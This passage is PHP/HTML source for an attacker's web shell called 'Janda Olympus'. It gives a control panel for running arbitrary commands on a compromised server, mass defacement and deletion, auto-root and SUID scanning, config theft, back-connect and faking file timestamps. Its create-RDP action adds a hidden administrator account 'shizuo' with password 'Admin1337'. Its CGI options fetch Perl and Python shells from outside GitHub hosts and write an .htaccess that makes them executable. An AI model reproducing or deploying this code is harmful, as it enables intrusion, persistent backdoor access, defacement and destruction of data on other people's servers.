                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=command" class="m-1 btn btn-outline-light btn-sm text-purple"><i class="fa fa-terminal"></i> Command</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=commandbypass" class="m-1 btn btn-outline-light btn-sm text-purple"><i class="fa fa-terminal"></i> Command Bypass</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=cgi-telnet" class="m-1 btn btn-outline-light btn-sm text-purple"><i class="fa fa-terminal"></i> CGI Telnet</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=masshtaccess" class="m-1 btn btn-outline-light btn-sm text-purple"><i class="fa fa-layer-group"></i> Mass Htaccess</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=massdeface" class="m-1 btn btn-outline-light btn-sm text-purple"><i class="fa fa-layer-group"></i> Mass Deface</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=massdelete" class="m-1 btn btn-outline-light btn-sm text-purple"><i class="fa fa-eraser"></i> Mass Delete</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=autoroot" class="m-1 btn btn-outline-light btn-sm text-purple"><i class="fa fa-hashtag"></i> Auto Root</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=scansuid" class="m-1 btn btn-outline-light btn-sm text-purple"><i class="fa fa-user"></i> Scan Suid</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=lockfileshidden" class="m-1 btn btn-outline-light btn-sm text-purple"><i class="fa fa-lock"></i> Lock File PHP</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=getconfig" class="m-1 btn btn-outline-light btn-sm text-purple"><i class="fa fa-eye"></i> Get Config</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=jumping" class="m-1 btn btn-outline-light btn-sm text-purple"><i class="fa fa-eye-slash"></i> Jumping</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=backconnect" class="m-1 btn btn-outline-light btn-sm text-purple"><i class="fa fa-network-wired"></i> Back Connect</a>
                            <a href="?logout" class="m-1 btn btn-outline-light btn-sm text-purple"><i class="fa fa-network-wired"></i> Logout</a>
                        </div>
                        <center>
                            <hr width='20%'>
                        </center>

                        <div class="container" id="tools">
                            <!-- endif -->
                            <?php if (isset($_GET['action']) && $_GET['action'] != 'download') : $action = $_GET['action'] ?>
                            <?php endif; ?>
                            <?php if (isset($_GET['action']) && $_GET['action'] != 'delete') : $action = $_GET['action'] ?>

                                <div class="col-md-12">
                                    <div class="row justify-content-center">
                                        <?php if ($action == 'rename' && isset($_GET['item'])) : ?>

                                            <div class="col-md-5">
                                                <form action="" method="post">
                                                    <div class="mb-3">
                                                        <label for="name" class="form-label">New Name</label>
                                                        <input type="text" class="form-control" name="newName" value="<?= $_GET['item'] ?>">
                                                    </div>
                                                    <button type="submit" class="btn btn-outline-light text-purple">Submit</button>
                                                    <button type="button" class="btn btn-outline-light text-purple" onclick="history.go(-1)">Back</button>
                                                </form>
                                            </div>
                                        <?php elseif ($action == 'edit' && isset($_GET['item'])) : ?>

                                            <div class="col-md-5">
                                                <form action="" method="post">
                                                    <div class="mb-3">
                                                        <label for="name" class="form-label"><?= $_GET['item'] ?></label>
                                                        <textarea id="CopyFromTextArea" name="newContent" rows="10" class="form-control"><?= htmlspecialchars(file_get_contents($path. '/'. $_GET['item'])) ?></textarea>
                                                    </div>
                                                    <button type="submit" class="btn btn-outline-light text-purple">Submit</button>
                                                    <button type="button" class="btn btn-outline-light text-purple" onclick="jscopy()">Copy</button>
                                                    <button type="button" class="btn btn-outline-light text-purple" onclick="history.go(-1)">Back</button>
                                                </form>
                                            </div>
                                        <?php elseif ($action == 'chmod' && isset($_GET['item'])) : ?>

                                            <div class="col-md-5">
                                                <form action="" method="post">
                                                    <div class="mb-3">
                                                        <label for="name" class="form-label"><?= $_GET['item'] ?></label>
                                                        <input type="number" class="form-control" name="newPerm" value="<?= substr(sprintf('%o', fileperms($_GET['item'])), -3); ?>">
                                                    </div>
                                                    <button type="submit" class="btn btn-outline-light text-purple">Submit</button>
                                                    <button type="button" class="btn btn-outline-light text-purple" onclick="history.go(-1)">Back</button>
                                                </form>
                                            </div>
                                        <?php elseif ($action == 'touch' && isset($_GET['item'])) : ?>


                                            <?php
                                            $directory = '.';
                                            $files = scandir($directory);
                                            $files = array_diff($files, array('.', '..'));
                                            $oldestTimestamp = PHP_INT_MAX;

                                            foreach ($files as $file) {
                                                if (is_file($directory . '/' . $file)) {
                                                    $timestamp = filemtime($directory . '/' . $file);

                                                if ($timestamp < $oldestTimestamp) {
                                                    $oldestTimestamp = $timestamp;
                                                    }
                                                }
                                            }
                                            $oldestDate = date('Y-m-d H:i:s', $oldestTimestamp);
                                            ?>

                                            <div class="col-md-5">
                                                <form action="" method="post">
                                                    <div class="mb-3">
                                                        <label for="name" class="form-label"><?= $_GET['item'] ?></label>
                                                        <input type="text" class="form-control" name="newDate" value="<?=  $oldestDate; ?>">
                                                    </div>
                                                    <button type="submit" class="btn btn-outline-light text-purple">Submit</button>
                                                    <button type="button" class="btn btn-outline-light text-purple" onclick="history.go(-1)">Back</button>
                                                </form>
                                            </div>
                                        <?php elseif ($action == 'upload') : ?>

                                            <div class="col-md-5">
                                                <form action="" method="post" enctype="multipart/form-data">
                                                    <div class="mb-3">
                                                        <label class="form-label">File Uploader</label>
                                                        <div class="input-group">
                                                            <input type="file" class="form-control" name="uploadfile[]" id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload" multiple>
                                                            <button class="btn btn-outline-light text-purple" type="submit" id="inputGroupFileAddon04">Upload</button>
                                                        </div>
                                                    </div>
                                                </form>
                                            </div>

                                        <?php elseif ($action == 'getfile') : ?>

                                            <div class="col-md-5">
                                                <form action="" method="post" enctype="multipart/form-data">
                                                            <div class="mb-3">
                                                                <label class="form-label">URL</label>
                                                            <input type="text" class="form-control" name="filedown" aria-label="URL">
                                                            </div>
                                                            <div class="mb-3">
                                                                <label class="form-label">Name</label>
                                                            <input type="text" class="form-control" name="namefile" aria-label="Name">
                                                            </div>
                                                            <input class="btn btn-outline-light text-purple" name=getf type=submit id=getf value=download>
                                                </form>
                                            </div>

                                        <?php elseif ($action == 'adminer') : ?>

                                            <div class="col-md-5">
                                                <form action="" method="post">
                                                    <select class="form-control" name="getadmin">
                                                        <option value="adminer">Adminer</option>
                                                    </select>
                                                        <input class="btn btn-success" type="submit" name="spawn" value="Summon">
                                                </form>
                                            </div>

                                        <?php elseif ($action == 'scanshell') : ?>

                                            <div class="col-md-5">
                                                <form action="" method="post">
                                                    <select class="form-control" name="getscan">
                                                        <option value="shelll">Get ScanShell</option>
                                                    </select>
                                                        <input class="btn btn-success" type="submit" name="shell" value="Summon">
                                                </form>
                                            </div>

                                         <?php elseif ($action == 'createrdp') : ?>

                                           <?php
                                            echo '<div class="container-fluid language-javascript">
                    <div class="shell mb-3">
                        <pre style="font-size:10px;"><code>'.exe("net user shizuo Admin1337 /add").exe("net localgroup administrators shizuo /add").'<br>If there is no "Access is denied." output, chances are that you have succeeded in creating a user here. Just log in using the username and password below.
hosts: <gr>'.gethostbyname($_SERVER["HTTP_HOST"]).'
username: shizuo
password: Admin1337</code></pre>
                    </div>
                </div>';?>

                                        <?php elseif ($action == 'command') : ?>

                                            <div class="col-md-5">
                                                <form action="" method="post">
                                                    <div class="mb-3">
                                                        <label class="form-label">Command</label>
                                                        <div class="input-group">
                                                            <input type="text" class="form-control form-control-sm" name="ucmd" placeholder="whoami">
                                                            <button class="btn btn-outline-light text-purple" type="submit">Submit</button>
                                                        </div>
                                                    </div>
                                                </form>
                                            </div>

                                       <?php elseif ($action == 'commandbypass') : ?>

                                                <div class="col-md-5">
                                                    <form method="post">
                                                        <div class="mb-3">
                                                    <select class="form-control" name="cmdbepas">
                                                        <option value="cmd8">CMD8</option>
                                                        <option value="cmd7">CMD7</option>
                                                    </select>
                                                        <label class="form-label">Command Bypass</label>
                                                        <div class="input-group">
                                                            <input type="text" class="form-control form-control-sm" name="cmdbypass" value="<?php echo $_POST['cmdbypass']; ?>">
                                                            <button class="btn btn-outline-light text-purple" type="submit" name="cmdbepass">Submit</button>
                                                        </div>
                                                        </div>
                                                    </form>
                                                    </div>
                                                </div>

                                        <?php elseif ($action == 'cgi-telnet') : ?>

                                            <div class="col-md-5">
                                                <form action="" method="post">
                                                    <select class="form-control" name="cgitelnet">
                                                        <option value="python">CGI Python</option>
                                                        <option value="perl">CGI Perl</option>
                                                    </select>
                                                        <input class="btn btn-success" type="submit" name="summon" value="Summon">
                                                </form>
                                            </div>

                                        <?php elseif ($action == 'massdeface') : ?>

                                            <?php massdeface($path); ?>
                                        <?php elseif ($action == 'masshtaccess') : ?>

                                            <?php masshtaccess($path); ?>
                                        <?php elseif ($action == 'massdelete') : ?>

                                            <?php massdelete($path); ?>
                                        <?php elseif ($action == 'autoroot') : ?>

                                            <?php autoroot(); ?>

                                        <?php elseif ($action == 'backup') : ?>

                                            <?php backup(); ?>

                                              <?php elseif ($action == 'scansuid') : ?>

                                            <?php scansuid(); ?>

                                        <?php elseif ($action == 'lockfileshidden') : ?>

                                            <div class="col-md-5">
                                                <form action="" method="post">
                                                    <div class="mb-3">
                                                        <label class="form-label">Lock File</label>
                                                        <div class="input-group">
                                                            <input type="text" class="form-control form-control-sm" name="lockfiless" placeholder="whoami">
                                                            <button class="btn btn-outline-light text-purple" type="submit">Submit</button>
                                                        </div>
                                                    </div>
                                                </form>
                                            </div>

                                        <?php elseif ($action == 'getconfig') : ?>

                                            <div class="col-md-5">
                                                    <div class="mb-3">
                                                        <?php getconfig();?>
                                                    </div>
                                            </div>

                                        <?php elseif ($action == 'jumping') : ?>

                                            <div class="col-md-5">
                                                    <div class="mb-3">
                                                        <?php jump();?>
                                                    </div>
                                            </div>

                                        <?php elseif ($action == 'backconnect') : ?>

                                            <div class="col-md-5">
                                                <!-- end php -->
                                                <?php bctool(); ?>

                                            </div>
                                        <!-- endif -->
                                        <?php endif; ?>

                                    </div>
                                </div>
                            <!-- endif -->
                            <?php endif; ?>

                            <?php if (isset($_POST['spawn'])) : ?>
                            <div class="p-2">
                                <div class="row justify-content-center">
                                    <div class="card col-md-7 mb-3">
                            <?php
                            if($_POST['getadmin'] == 'adminer') {
                            $adminer_dir = mkdir('adminer', 0755);chdir('adminer');$file_cgi = "adminer.php";$adminer="https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php";fdown($adminer, $file_cgi);chmod($file_cgi, 0755);
                            $adminerdir = 'adminer';
                            echo "<center><span class='text-success'>Successfully Spawn Adminer</span><br><a class='text-primary' href='". $adminerdir . "/" . $file_cgi ."' target=_blank>Klik Disini</a></center>";
                            }
                            ?>
                                    </div>
                                </div>
                            </div>
                            <!-- endif -->
                            <?php endif; ?>

                            <?php if (isset($_POST['shell'])) : ?>
                            <div class="p-2">
                                <div class="row justify-content-center">
                                    <div class="card col-md-7 mb-3">
                            <?php
                            if($_POST['getscan'] == 'shelll') {
                            $adminer_dir = mkdir('scan', 0755);chdir('scan');$file_cgi = "scan.php";$adminer="https://raw.githubusercontent.com/shizuosec/code/main/scan.php";fdown($adminer, $file_cgi);chmod($file_cgi, 0755);
                            $adminerdir = 'scan';
                            echo "<center><span class='text-success'>Successfully Spawn Adminer</span><br><a class='text-primary' href='". $adminerdir . "/" . $file_cgi ."' target=_blank>Klik Disini</a></center>";
                            }
                            ?>
                                    </div>
                                </div>
                            </div>
                            <!-- endif -->
                            <?php endif; ?>

                            <!-- command -->
                            <?php if (isset($_POST['ucmd'])) : ?>
                            <div class="p-2">
                                <div class="row justify-content-center">
                                    <div class="card text-purple col-md-7 mb-3">
                                        <pre><?php echo $nm."@".$serv.":~#&nbsp;"; echo $x = $_POST['ucmd'];"<br>"; ?><br><br><code><?php echo exe($x.' 2>&1'); ?></code></pre>
                                    </div>
                                </div>
                            </div>
                            <!-- endif -->
                            <?php endif; ?>

                            <!-- command bypass -->
                            <?php if (isset($_POST['cmdbepass'])) : ?>
                            <div class="p-2">
                                <div class="row justify-content-center">
                                    <div class="card text-purple col-md-7 mb-3">
                                        <pre><?php echo $nm."@".$serv.":~#&nbsp;"; echo $x = $_POST['cmdbypass']; $x."<br>"; ?><br><br><code><?php if($_POST['cmdbepas'] == 'cmd8') { echo cmd8($_POST['cmdbypass']); } if($_POST['cmdbepas'] == 'cmd7') { echo cmd7($_POST['cmdbypass']); } ?></code></pre>
                                    </div>
                                </div>
                            </div>
                            <!-- endif -->
                            <?php endif; ?>

                            <?php if (isset($_POST['summon'])) : ?>
                            <div class="p-2">
                                <div class="row justify-content-center">
                                    <div class="card col-md-7 mb-3">
                            <?php
                            if($_POST['cgitelnet'] == 'perl') {
            $cgi_dir = mkdir('shizuo_cgi', 0755);chdir('shizuo_cgi');$file_cgi = "cgipl.sz";$memeg = ".htaccess";$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .sz \n AddHandler cgi-script .sz \n AddHandler cgi-script .sz";$htcgi = fopen(".htaccess", "w");$cgipl="https://raw.githubusercontent.com/shizuo1337/bc/main/cgi.pl";fdown($cgipl, $file_cgi);fwrite($htcgi, $isi_htcgi);chmod($file_cgi, 0755);chmod($memeg, 0755);
            $cgidir = 'shizuo_cgi';
            echo "<center><span class='text-success'>Successfully Summon CGI</span><br><a class='text-primary' href='". $cgidir . "/" . $file_cgi ."' target=_blank>Klik Disini</a></center>";
        }
        if($_POST['cgitelnet'] == 'python') {
            $cgi_dir = mkdir('shizuo_cgi', 0755);chdir('shizuo_cgi');$file_cgi = "cgipy.sz";$memeg = ".htaccess";$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .sz \n AddHandler cgi-script .sz \n AddHandler cgi-script .sz";$htcgi = fopen(".htaccess", "w");$cgipl="https://raw.githubusercontent.com/shizuo1337/bc/main/cgi.py";fdown($cgipl, $file_cgi);fwrite($htcgi, $isi_htcgi);chmod($file_cgi, 0755);chmod($memeg, 0755);
            $cgidir = 'shizuo_cgi';
            echo "<center><span class='text-success'>Successfully Summon CGI</span><br><a class='text-primary' href='". $cgidir . "/" . $file_cgi ."' target=_blank>Klik Disini</a></center>";
        }
                            ?>
                                    </div>
                                </div>
                            </div>
                            <!-- endif -->
                            <?php endif; ?>

                            <!-- lockfileshidden -->
                            <?php if (isset($_POST['lockfiless'])) : ?>
                            <div class="p-2">
                                <div class="row justify-content-center">
                                    <div class="card col-md-7 mb-3">
                                        <?php lockfileshidden(); ?>
                                        <?php echo '<span class="text-success">File Locked Success</span>';  ?>
                                    </div>
                                </div>
                            </div>
                            <!-- endif -->
                            <?php endif; ?>


                            <!-- new file -->
                            <div class="col-md-12">
                                <div class="collapse" id="newFileCollapse" data-bs-parent="#tools">
                                    <div class="row justify-content-center">
                                        <div class="col-md-5">
                                            <form action="" method="post">
                                                <div class="mb-3">
                                                    <label class="form-label">File Name</label>
                                                    <input type="text" class="form-control" name="newFileName" placeholder="test.php">
                                                </div>
                                                <div class="mb-3">
                                                    <label class="form-label">File Content</label>
                                                    <textarea class="form-control" rows="7" name="newFileContent" placeholder="Hello-World"></textarea>
                                                </div>
                                                <button type="submit" class="btn btn-outline-light text-purple">Create</button>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <!-- new folder -->
                            <div class="col-md-12">
                                <div class="collapse" id="newFolderCollapse" data-bs-parent="#tools">
                                    <div class="row justify-content-center">
                                        <div class="col-md-5">
                                            <form action="" method="post">
                                                <div class="mb-3">
                                                    <label class="form-label">Folder Name</label>
                                                    <input type="text" class="form-control" name="newFolderName" placeholder="home">
                                                </div>
                                                <button type="submit" class="btn btn-outline-light text-purple">Create</button>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- file manager -->
                    <div class="table-responsive mt-3">
                        <table class="table table-hover table-dark align-middle text-purple">
                            <thead class="align-middle">
                                <tr>
                                    <td style="width:35%">Name</td>
                                    <td style="width:10%">Type</td>
                                    <td style="width:10%">Size</td>
                                    <td style="width:13%">Owner/Group</td>
                                    <td style="width:10%">Permission</td>
                                    <td style="width:13%">Last Modified</td>
                                    <td style="width:9%">Actions</td>
                                </tr>
                            </thead>
                            <tbody class="text-nowrap">
                                <!-- end php -->
                                <?php
                                    foreach ($dirs as $dir) :
                                        if (!is_dir($dir)) continue;
                                ?>

                                <tr>
                                    <td>
                                        <?php if ($dir === '..') : ?>

                                            <a href="?dir=<?= dirname($path); ?>" class="text-decoration-none text-purple"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
                                        <?php elseif ($dir === '.') :  ?>

                                            <a href="?dir=<?= $path; ?>" class="text-decoration-none text-purple"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
                                        <?php else : ?>

                                            <a href="?dir=<?= $path . '/' . $dir ?>" class="text-decoration-none text-purple"><i class="fa fa-folder"></i> <?= $dir ?></a>
                                        <!-- endif -->
                                        <?php endif; ?>

                                    </td>
                                    <td class="text-purple"><?= filetype($dir) ?></td>
                                    <td class="text-purple">-</td>
                                    <td class="text-purple"><?= getOwner($dir) ?></td>
                                    <td class="text-purple">
                                    <!-- end php -->
                                        <?php
                                            echo '<a href="?dir='.$path.'&item='.$dir.'&action=chmod">';
                                                if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
                                                elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
                                                echo perms($path.'/'.$dir);
                                                if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir))
                                            echo '</a>';
                                        ?>

                                    </td>
                                    <td class="text-purple">
                                    <?php
                                    echo '<a href="?dir='.$path.'&item='.$dir.'&action=touch">';
                                    echo '<span class="text-purple">' . date("Y-m-d h:i:s", filemtime($dir)) . '</span>';
                                    echo '</a>';
                                    ?>
                                    
                                </td>
                                    <td>
                                        <?php if ($dir != '.' && $dir != '..') : ?>

                                            <div class="btn-group">
                                                <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1 text-purple" data-toggle="tooltip" data-placement="auto" title="Rename"><i class="fa fa-edit"></i></a>
                                                <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1 text-purple" data-toggle="tooltip" data-placement="auto" title="Change Permission"><i class="fa fa-star"></i></a>
                                                <a href="" class="btn btn-outline-light btn-sm mr-1 text-purple" onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')" data-toggle="tooltip" data-placement="auto" title="Delete"><i class="fa fa-trash"></i></a>
                                            </div>
                                        <?php elseif ($dir === '.') : ?>

                                            <div class="btn-group">
                                                <a data-bs-toggle="collapse" href="#newFolderCollapse" role="button" aria-expanded="false" aria-controls="newFolderCollapse" class="btn btn-outline-light btn-sm mr-1 text-purple" data-toggle="tooltip" data-placement="auto" title="New Folder"><i class="fa fa-folder-plus"></i></a>
                                                <a data-bs-toggle="collapse" href="#newFileCollapse" role="button" aria-expanded="false" aria-controls="newFileCollapse" class="btn btn-outline-light btn-sm mr-1 text-purple" data-toggle="tooltip" data-placement="auto" title="New File"><i class="fa fa-file-plus"></i></a>
                                            </div>
                                        <!-- endif -->
                                        <?php endif; ?>

                                    </td>
                                </tr>
                                <!-- endforeach -->
                                <?php endforeach; ?>
                                    <!-- end php -->
                                    <?php
                                        foreach ($dirs as $dir) :
                                        if (!is_file($dir)) continue;
                                    ?>

                                    <tr>
                                        <td>
                                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=edit" class="text-decoration-none text-purple"><i class="fa fa-file-code"></i> <?= $dir ?></a>
                                        </td>
                                        <td class="text-purple"><?= (function_exists('mime_content_type') ? mime_content_type($dir) : filetype($dir)) ?></td>
                                        <td class="text-purple"><?= fsize($dir) ?></td>
                                        <td class="text-purple"><?= getOwner($dir) ?></td>
                                        <td class="text-purple">
                                        <!-- end php -->
                                            <?php
                                                echo '<a href="?dir='.$path.'&item='.$dir.'&action=chmod">';
                                                    if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
                                                    elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
                                                    echo perms($path.'/'.$dir);
                                                    if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir))
                                                echo '</a>';
                                            ?>

                                        </td>
                                        <td class="text-purple">
                                            <?php
                                    echo '<a href="?dir='.$path.'&item='.$dir.'&action=touch">';
                                    echo '<span class="text-purple">' . date("Y-m-d h:i:s", filemtime($dir)) . '</span>';
                                    echo '</a>';
                                    ?>
                                        </td>
                                        <td>
                                            <?php if ($dir != '.' && $dir != '..') : ?>

                                                <div class="btn-group">
                                                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=edit" class="btn btn-outline-light btn-sm mr-1 text-purple" data-toggle="tooltip" data-placement="auto" title="Edit"><i class="fa fa-file-edit"></i></a>
                                                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1 text-purple" data-toggle="tooltip" data-placement="auto" title="Rename"><i class="fa fa-edit"></i></a>
                                                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1 text-purple" data-toggle="tooltip" data-placement="auto" title="Change Permission"><i class="fa fa-star"></i></a>
                                                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=download" class="btn btn-outline-light btn-sm mr-1 text-purple" data-toggle="tooltip" data-placement="auto" title="Download"><i class="fa fa-file-download"></i></a>
                                                    <a href="" class="btn btn-outline-light btn-sm mr-1 text-purple" onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')" data-toggle="tooltip" data-placement="auto" title="Delete"><i class="fa fa-trash"></i></a>
                                                </div>
                                            <!-- endif -->
                                            <?php endif; ?>

                                        </td>
                                    </tr>
                                <!-- endforeach -->
                                <?php endforeach; ?>

                            </tbody>
                        </table>
                    </div>
                    <center><div class="text-purple my-1">Copyright &copy; 2020-<script>document.write(new Date().getFullYear())</script> Janda Olympus</div></center>
                </div>
            </div>
        </div>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.4.0/dist/sweetalert2.all.min.js"></script>
        <script>
            <?php if (isset($_SESSION['message'])) : ?>
                Swal.fire(
                '<?= $_SESSION['status'] ?>',
                '<?= $_SESSION['message'] ?>',
                '<?= $_SESSION['class'] ?>'
                )
            <?php endif; clear(); ?>

            function deleteConfirm(url) {
                event.preventDefault()
                Swal.fire({
                    title: 'Are you sure?',
                    icon: 'warning',
                    showCancelButton: true,
                    confirmButtonColor: '#3085d6',
                    cancelButtonColor: '#d33',
                    confirmButtonText: 'Yes, delete it!'
                }).then((result) => {
                    if (result.isConfirmed) {
                        window.location.href = url
                    }
                })
            }
            function jscopy() {
                var jsCopy = document.getElementById("CopyFromTextArea");
                jsCopy.focus();
                jsCopy.select();
                document.execCommand("copy");
            }
        </script>
    </body>
</html>